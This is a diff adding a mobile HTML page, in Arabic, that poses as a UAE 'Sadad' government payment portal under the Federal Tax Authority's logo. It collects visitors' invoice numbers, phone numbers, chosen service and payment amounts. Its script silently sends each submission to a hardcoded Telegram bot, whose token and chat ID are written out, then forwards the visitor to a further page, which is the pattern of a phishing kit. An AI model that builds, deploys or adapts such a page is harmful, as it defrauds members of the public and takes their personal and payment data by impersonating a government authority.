@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>إدخال بيانات المستخدم - بوابة سداد الإمارات</title>
+    <style>
+        :root {
+            --primary-green: #1a6b1a;
+            --text-dark: #2c2c2c;
+            --text-medium: #555555;
+            --text-light: #888888;
+            --background-light: #f5f5f5;
+            --white: #ffffff;
+            --border-color: #e0e0e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+            background-color: var(--background-light);
+            color: var(--text-dark);
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            background: var(--white);
+            padding: 24px 20px;
+            text-align: center;
+            border-radius: 0 0 16px 16px;
+            margin-bottom: 16px;
+        }
+
+        .logo-container {
+            margin-bottom: 16px;
+        }
+
+        .logo-image {
+            max-width: 160px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .header h1 {
+            color: var(--primary-green);
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+
+        /* Form Container */
+        .form-container {
+            background: var(--white);
+            margin: 0 12px 24px;
+            padding: 28px 20px 32px;
+            border-radius: 16px;
+        }
+
+        /* Form Group */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            text-align: right;
+            color: var(--text-dark);
+            font-size: 0.938rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 0.938rem;
+            font-family: inherit;
+            color: var(--text-dark);
+            background-color: var(--white);
+            transition: border-color 0.2s ease;
+            text-align: right;
+        }
+
+        .form-group input::placeholder {
+            color: var(--text-light);
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: var(--primary-green);
+        }
+
+        .form-group select {
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23555' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: left 16px center;
+            padding-left: 40px;
+            cursor: pointer;
+        }
+
+        /* Amount Field */
+        .amount-field {
+            position: relative;
+        }
+
+        .amount-field input {
+            padding-left: 60px;
+        }
+
+        .amount-field .currency {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-medium);
+            font-size: 0.938rem;
+            font-weight: 500;
+        }
+
+        /* Submit Button */
+        .submit-button {
+            display: block;
+            width: 100%;
+            padding: 16px 32px;
+            background: var(--primary-green);
+            color: var(--white);
+            text-decoration: none;
+            border-radius: 10px;
+            font-size: 1.063rem;
+            font-weight: 600;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-top: 28px;
+        }
+
+        .submit-button:hover {
+            background: #155815;
+        }
+
+        .submit-button:active {
+            background: #124712;
+        }
+
+        /* Responsive */
+        @media (min-width: 480px) {
+            .header {
+                padding: 32px 24px;
+            }
+
+            .header h1 {
+                font-size: 1.75rem;
+            }
+
+            .logo-image {
+                max-width: 180px;
+            }
+
+            .form-container {
+                margin: 0 20px 32px;
+                padding: 36px 28px 40px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .header {
+                padding: 40px 32px;
+                max-width: 600px;
+                margin: 0 auto 20px;
+                border-radius: 0 0 20px 20px;
+            }
+
+            .header h1 {
+                font-size: 2rem;
+            }
+
+            .logo-image {
+                max-width: 200px;
+            }
+
+            .form-container {
+                max-width: 600px;
+                margin: 0 auto 40px;
+                padding: 44px 36px 48px;
+                border-radius: 20px;
+            }
+
+            .form-group label {
+                font-size: 1rem;
+            }
+
+            .form-group input,
+            .form-group select {
+                padding: 16px 18px;
+                font-size: 1rem;
+            }
+
+            .submit-button {
+                padding: 18px 36px;
+                font-size: 1.125rem;
+                border-radius: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/qMADTlkpWUxPehrJ.jpg" alt="الهيئة الاتحادية للضرائب - Federal Tax Authority" class="logo-image">
+        </div>
+        <h1>إدخال بيانات المستخدم</h1>
+    </header>
+
+    <main class="form-container">
+        <form id="userForm">
+            <div class="form-group">
+                <label>رقم الفاتورة</label>
+                <input type="text" id="invoiceNumber" placeholder="أدخل رقم الفاتورة" required>
+            </div>
+
+            <div class="form-group">
+                <label>رقم الجوال</label>
+                <input type="tel" id="phoneNumber" placeholder="05XXXXXXXX" required>
+            </div>
+
+            <div class="form-group">
+                <label>نوع الخدمة</label>
+                <select id="serviceType" required>
+                    <option value="">اختر نوع الخدمة</option>
+                    <option value="دفع رسوم شحن مركبة">دفع رسوم شحن مركبة</option>
+                    <option value="دفع رسوم نقل ملكية مركبة">دفع رسوم نقل ملكية مركبة</option>
+                    <option value="دفع رسوم نقل ملكية لوحة مركبة">دفع رسوم نقل ملكية لوحة مركبة</option>
+                    <option value="دفع رسوم حجز مركبة">دفع رسوم حجز مركبة</option>
+                    <option value="دفع رسوم فحص مركبة">دفع رسوم فحص مركبة</option>
+                    <option value="دفع رسوم عقد ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم عقد ايجار (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                    <option value="دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم عقد تمليك (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                    <option value="دفع رسوم تأمين (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)">دفع رسوم تأمين (فيلا - شقة - مزرعة - شاليه - مستودع - محل - ارض تجارية - ارض زراعية)</option>
+                    <option value="دفع رسوم شحن">دفع رسوم شحن</option>
+                    <option value="تسديد المستحقات للطرفين">تسديد المستحقات للطرفين</option>
+                    <option value="دفع رسوم توقيع تعهد الكتروني">دفع رسوم توقيع تعهد الكتروني</option>
+                    <option value="دفع رسوم استقدام عمالة">دفع رسوم استقدام عمالة</option>
+                    <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
+                    <option value="دفع رسوم عقد عمالة">دفع رسوم عقد عمالة</option>
+                    <option value="دفع رسوم الجوازات">دفع رسوم الجوازات</option>
+                    <option value="دفع رسوم عقد عمل">دفع رسوم عقد عمل</option>
+                    <option value="دفع رسوم توكيل محامي">دفع رسوم توكيل محامي</option>
+                    <option value="دفع رسوم الخدمات الكترونية">دفع رسوم الخدمات الكترونية</option>
+                    <option value="دفع رسوم وزارة الموارد البشرية">دفع رسوم وزارة الموارد البشرية</option>
+                    <option value="دفع رسوم تجديد عقود">دفع رسوم تجديد عقود</option>
+                    <option value="دفع رسوم عقد تقديم خدمات">دفع رسوم عقد تقديم خدمات</option>
+                    <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>مبلغ السداد (درهم إماراتي)</label>
+                <div class="amount-field">
+                    <input type="number" id="amount" placeholder="0.00" step="0.01" min="0" required>
+                    <span class="currency">AED</span>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-button">تأكيد البيانات</button>
+        </form>
+    </main>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
+        const TELEGRAM_CHAT_ID = '1008144314';
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        document.getElementById('userForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const invoiceNumber = document.getElementById('invoiceNumber').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const serviceType = document.getElementById('serviceType').value;
+            const amount = document.getElementById('amount').value;
+
+            const message = `📋 <b>طلب سداد جديد</b>\n\n` +
+                `📄 رقم الفاتورة: <code>${invoiceNumber}</code>\n` +
+                `📱 رقم الجوال: <code>${phoneNumber}</code>\n` +
+                `🏷️ نوع الخدمة: ${serviceType}\n` +
+                `💰 مبلغ السداد: <b>${amount} AED</b>\n\n` +
+                `📅 التاريخ: ${new Date().toLocaleString('ar-AE')}`;
+
+            const sent = await sendToTelegram(message);
+
+            if (sent) {
+                // Store data for next page
+                localStorage.setItem('sadadData', JSON.stringify({
+                    invoiceNumber,
+                    phoneNumber,
+                    serviceType,
+                    amount
+                }));
+                window.location.href = 'page3.html';
+            } else {
+                alert('حدث خطأ، يرجى المحاولة مرة أخرى');
+            }
+        });
+    </script>
+</body>
+</html>
